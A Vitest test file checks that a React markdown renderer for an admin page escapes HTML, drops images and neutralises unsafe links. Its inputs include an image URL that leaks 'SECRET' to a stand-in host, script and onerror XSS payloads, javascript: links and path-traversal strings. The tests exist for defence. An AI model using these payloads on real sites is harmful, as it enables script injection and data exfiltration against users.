import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import SafeMarkdown, { isSitePath, parseBlocks } from '../SafeMarkdown';

const html = (text: string) => renderToStaticMarkup(<SafeMarkdown text={text} />);

describe('SafeMarkdown', () => {
  it('never renders an image, and never lets its URL leave the page', () => {
    const out = html('Look: ![chart](https://evil.example/?q=SECRET) done');
    expect(out).not.toContain('<img');
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('SECRET');
    expect(out).toContain('chart');
  });

  it('never renders a javascript: link as a link', () => {
    const out = html('[click me](javascript:alert(1)) and [data](data:text/html;base64,AAAA)');
    expect(out).not.toMatch(/<a[\s>]/);
    expect(out).not.toMatch(/href=/);
  });

  it('shows an outside link as plain text, so the admin sees where it points and nothing is clickable', () => {
    const out = html('See [the docs](https://example.com/page) for more');
    expect(out).not.toMatch(/<a[\s>]/);
    expect(out).toContain('the docs (https://example.com/page)');
  });

  it('links a path on this site', () => {
    const out = html('Open [the league](/admin/leagues/11111111-1111-4111-8111-111111111111?tab=phases)');
    expect(out).toMatch(/<a [^>]*href="\/admin\/leagues\/11111111-1111-4111-8111-111111111111\?tab=phases"/);
  });

  it.each([
    ['/admin/leagues', true],
    ['/leagues/abc?x=1#top', true],
    ['//evil.example', false],
    ['/\\evil.example', false],
    ['/admin/../secret', false],
    ['https://example.com', false],
    ['javascript:alert(1)', false],
    ['admin/leagues', false],
    ['/admin/leagues/ x', false],
  ])('treats %s as a site path: %s', (target, expected) => {
    expect(isSitePath(target)).toBe(expected);
  });

  it('escapes raw HTML instead of running it', () => {
    const out = html('<script>alert(1)</script> <img src=x onerror=alert(1)> <b>bold?</b>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;script&gt;');
  });

  it('renders emphasis, code, lists, headings and fenced code', () => {
    const out = html('# Plan\n\nA **bold** and *soft* word with `code`.\n\n- one\n- two\n\n1. first\n2. second\n\n```\nlet x = <b>1</b>;\n```');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('<em>soft</em>');
    expect(out).toContain('<code class="rounded bg-poke-muted px-1 py-0.5 text-[0.85em]">code</code>');
    expect(out).toMatch(/<ul[^>]*><li>one<\/li><li>two<\/li><\/ul>/);
    expect(out).toMatch(/<ol[^>]*><li>first<\/li><li>second<\/li><\/ol>/);
    expect(out).toContain('&lt;b&gt;1&lt;/b&gt;');
    // A heading is a bold line, not a heading element: the page keeps its own outline.
    expect(out).not.toMatch(/<h\d/);
    expect(out).toContain('<strong>Plan</strong>');
  });

  it('keeps single line breaks inside a paragraph', () => {
    expect(html('one\ntwo')).toContain('one<br/>two');
    expect(parseBlocks('one\ntwo\n\nthree')).toEqual([
      { type: 'paragraph', lines: ['one', 'two'] },
      { type: 'paragraph', lines: ['three'] },
    ]);
  });

  it('handles empty, unterminated and hostile-looking input without throwing', () => {
    expect(html('')).toBe('<div class="space-y-2 break-words text-sm leading-relaxed"></div>');
    expect(() => html('```\nnever closed')).not.toThrow();
    expect(() => html('**unclosed [link](')).not.toThrow();
    expect(() => html('[' + 'a'.repeat(5000) + '](/x)')).not.toThrow();
  });
});
